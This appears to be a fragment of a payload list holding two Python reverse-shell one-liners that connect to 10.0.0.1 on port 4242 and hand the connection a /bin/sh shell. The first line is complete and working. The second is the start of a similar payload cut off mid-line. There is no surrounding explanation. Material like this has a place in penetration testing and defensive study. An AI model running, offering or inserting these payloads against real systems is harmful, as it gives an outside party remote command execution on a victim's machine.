```python
import socket,os,pty;s=socket.socket();s.connect(('10.0.0.1',4242));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn('/bin/sh')
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.0.0.1',4242));o
